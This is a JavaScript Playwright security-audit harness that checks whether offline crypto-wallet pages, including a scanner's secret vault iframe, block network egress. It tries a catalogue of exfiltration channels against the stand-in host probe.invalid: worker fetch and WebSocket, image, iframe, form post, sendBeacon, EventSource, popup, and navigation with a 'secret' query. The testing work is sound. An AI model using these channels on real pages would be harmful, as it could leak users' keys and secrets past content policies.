// AUD-026 security reviewer (CHECK-SEC-002): the effective runtime policy of the built pages
// (dist/, both editions, file://), beyond what the regression case "boundaries" covers (inline
// script, fetch, parent DOM). In each offline document and in the Scanner's Secret Vault it tries
// the other ways out: fetch and WebSocket from a blob worker, a new worker, an image, a nested
// frame, a form submission, sendBeacon, EventSource, WebSocket, a popup, and (last, on a page of its
// own) the vault navigating itself to an https URL. DNS is mapped to NOTFOUND for the browser and
// every non-file request is aborted and recorded, so nothing leaves the machine. Exit 1 when a way
// out is not blocked where the page promises no network.
//
// Usage: node docs/audits/AUD-026-harnesses/security-boundaries-runtime.mjs [chromium|firefox]
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { loadPlaywright } from "../../../tooling/playwright-loader.mjs";
import { BUILD_PROFILES, getToolBuild } from "../../../tooling/build-profiles.mjs";

const root = fileURLToPath(new URL("../../../", import.meta.url));
const [engine = "chromium"] = process.argv.slice(2);
const playwright = await loadPlaywright();
const report = { engine, pages: [], failures: [] };

/** Runs in a document: every way out it can try without leaving the page. */
async function probeDocument() {
  const violations = [];
  document.addEventListener("securitypolicyviolation", (event) =>
    violations.push(event.effectiveDirective),
  );
  const result = {};
  const settle = (ms) => new Promise((done) => setTimeout(done, ms));
  const attempt = async (name, run) => {
    try {
      result[name] = await run();
    } catch (cause) {
      result[name] = `threw ${cause?.name ?? "error"}`;
    }
  };
  await attempt("blobWorker", async () => {
    const source =
      'const seen = []; addEventListener("securitypolicyviolation", (e) => seen.push(e.effectiveDirective)); onmessage = async () => { const out = {}; try { await fetch("https://probe.invalid/worker-fetch"); out.fetch = "allowed"; } catch (e) { out.fetch = "blocked " + e.name; } try { const s = new WebSocket("wss://probe.invalid/worker-ws"); await new Promise((done) => { s.onerror = s.onclose = done; setTimeout(done, 1000); }); out.ws = "readyState " + s.readyState; s.close(); } catch (e) { out.ws = "blocked " + e.name; } out.violations = [...new Set(seen)]; postMessage(out); };';
    const url = URL.createObjectURL(new Blob([source], { type: "text/javascript" }));
    const worker = new Worker(url);
    const answer = await Promise.race([
      new Promise((done) => {
        worker.onmessage = (event) => done(event.data);
        worker.onerror = (event) => done(`worker error ${event.message ?? ""}`.trim());
        worker.postMessage("go");
      }),
      settle(3000).then(() => "no answer"),
    ]);
    worker.terminate();
    return answer;
  });
  await attempt("image", async () => {
    const image = new Image();
    const outcome = new Promise((done) => {
      image.onload = () => done("loaded");
      image.onerror = () => done("error");
    });
    image.src = "https://probe.invalid/image.png";
    return Promise.race([outcome, settle(2000).then(() => "pending")]);
  });
  await attempt("nestedFrame", async () => {
    const frame = document.createElement("iframe");
    frame.src = "https://probe.invalid/frame";
    document.body.append(frame);
    await settle(500);
    frame.remove();
    return "inserted";
  });
  await attempt("form", async () => {
    const form = document.createElement("form");
    form.action = "https://probe.invalid/form";
    form.method = "post";
    form.target = "_blank";
    document.body.append(form);
    form.submit();
    await settle(300);
    form.remove();
    return "submitted";
  });
  await attempt("sendBeacon", async () =>
    String(navigator.sendBeacon("https://probe.invalid/b", "x")),
  );
  await attempt("eventSource", async () => {
    const source = new EventSource("https://probe.invalid/es");
    await settle(300);
    const state = source.readyState;
    source.close();
    return `readyState ${state}`;
  });
  await attempt("webSocket", async () => {
    const socket = new WebSocket("wss://probe.invalid/ws");
    await settle(300);
    const state = socket.readyState;
    socket.close();
    return `readyState ${state}`;
  });
  await attempt("popup", async () =>
    window.open("https://probe.invalid/popup") === null ? "null" : "opened",
  );
  await attempt("rtcPeerConnection", async () => typeof RTCPeerConnection);
  await settle(300);
  return { result, violations: [...new Set(violations)].sort() };
}

const launchOptions =
  engine === "chromium"
    ? { headless: true, args: ["--host-resolver-rules=MAP * ~NOTFOUND"] }
    : {
        headless: true,
        firefoxUserPrefs: { "network.dns.forceResolve": "0.0.0.0", "network.proxy.type": 0 },
      };
const browser = await playwright[engine].launch(launchOptions);
try {
  for (const profileId of ["multi-chain", "dash-community"]) {
    const profile = BUILD_PROFILES[profileId];
    for (const tool of ["key-derivation", "psbt-inspector", "discovery-scanner"]) {
      const path = resolve(root, "dist", getToolBuild(profile, tool).artifactRelativePath);
      const context = await browser.newContext();
      // `attempted`: every non-file request the browser reported, including those its CSP then
      // blocked before the network stack; `requests`: those that reached the network stack, where
      // the route handler aborts them (and DNS is mapped to NOTFOUND besides).
      const attempted = [];
      const requests = [];
      context.on("request", (request) => {
        if (!/^(?:file|blob|data|about|chrome-error):/u.test(request.url()))
          attempted.push(request.url());
      });
      context.on("requestfailed", (request) => {
        if (!/^(?:file|blob|data|about|chrome-error):/u.test(request.url()))
          attempted.push(`${request.url()} failed: ${request.failure()?.errorText ?? "?"}`);
      });
      await context.route(/^(?!file:|blob:|data:|about:)/u, (route) => {
        requests.push(route.request().url());
        return route.abort();
      });
      const page = await context.newPage();
      page.setDefaultTimeout(60000);
      const popups = [];
      page.on("popup", (popup) => popups.push(popup.url()));
      await page.goto(pathToFileURL(path).href);
      const entry = {
        page: `${profileId}/${tool}`,
        sha256: createHash("sha256").update(readFileSync(path)).digest("hex"),
      };
      if (tool === "discovery-scanner") {
        const vault = page.frameLocator("#recovery-secret-vault");
        await vault.locator("#recovery-self-test.passed").waitFor({ timeout: 120000 });
        const frame = page.frames().find((candidate) => candidate !== page.mainFrame());
        entry.vaultOrigin = await frame.evaluate(() => origin);
        entry.vault = await frame.evaluate(probeDocument);
      } else {
        const ready =
          tool === "key-derivation"
            ? "#crypto-self-test-status.passed"
            : "#psbt-self-test-status.passed";
        await page.locator(ready).waitFor({ timeout: 120000 });
        entry.document = await page.evaluate(probeDocument);
      }
      entry.popups = popups;
      entry.attempted = [...attempted];
      entry.requests = [...requests];
      if (tool === "discovery-scanner") {
        // Last: the vault navigates itself to an https URL; the shell's frame-src decides.
        const shellViolations = await page.evaluate(() => {
          window.__shellViolations = [];
          document.addEventListener("securitypolicyviolation", (event) =>
            window.__shellViolations.push(event.effectiveDirective),
          );
          return true;
        });
        void shellViolations;
        const frame = page.frames().find((candidate) => candidate !== page.mainFrame());
        await frame
          .evaluate(() => {
            location.href = "https://probe.invalid/vault-navigation?secret=synthetic";
          })
          .catch(() => undefined);
        await page.waitForTimeout(1500);
        entry.selfNavigation = {
          shellViolations: await page.evaluate(() => window.__shellViolations),
          frameUrl:
            page
              .frames()
              .find((candidate) => candidate !== page.mainFrame())
              ?.url() ?? null,
          requestsAfter: requests.filter((url) => url.includes("vault-navigation")),
        };
      }
      if (tool !== "discovery-scanner") {
        // Last: the offline document navigates itself to an https URL; no CSP directive it sets
        // governs a top-level navigation.
        await page
          .evaluate(() => {
            location.href = "https://probe.invalid/top-navigation?secret=synthetic";
          })
          .catch(() => undefined);
        await page.waitForTimeout(1500);
        entry.selfNavigation = {
          pageUrl: page.url(),
          requestsAfter: requests.filter((url) => url.includes("top-navigation")),
        };
      }
      await context.close();
      report.pages.push(entry);

      // Expectations: every way out of an offline document or the vault is blocked.
      const probes = entry.vault ?? entry.document;
      const where = `${entry.page}${entry.vault ? " vault" : ""}`;
      const expectBlocked = (name, ok) => {
        if (!ok) report.failures.push(`${where}: ${name} = ${JSON.stringify(probes.result[name])}`);
      };
      const worker = probes.result.blobWorker;
      if (tool === "key-derivation")
        expectBlocked(
          "blobWorker",
          typeof worker === "object" &&
            !/allowed/u.test(worker.fetch) &&
            worker.violations.includes("connect-src"),
        );
      else
        expectBlocked("blobWorker", typeof worker !== "object" || !/allowed/u.test(worker.fetch));
      expectBlocked("image", probes.result.image !== "loaded");
      // sendBeacon returns true once it queued the beacon; its CSP check comes later, so only the
      // network-stack list below tells whether one left.
      expectBlocked("popup", probes.result.popup !== "opened");
      if (entry.popups.length > 0) report.failures.push(`${where}: popup opened ${entry.popups}`);
      if (entry.requests.length > 0)
        report.failures.push(`${where}: requests reached the network layer: ${entry.requests}`);
      if (entry.selfNavigation && entry.selfNavigation.requestsAfter.length > 0)
        report.failures.push(`${where}: self-navigation to https reached the network layer`);
      if (entry.vaultOrigin !== undefined && entry.vaultOrigin !== "null")
        report.failures.push(`${where}: vault origin ${entry.vaultOrigin}`);
    }
  }
} finally {
  await browser.close();
}
console.log(JSON.stringify(report, null, 2));
process.exit(report.failures.length > 0 ? 1 : 0);
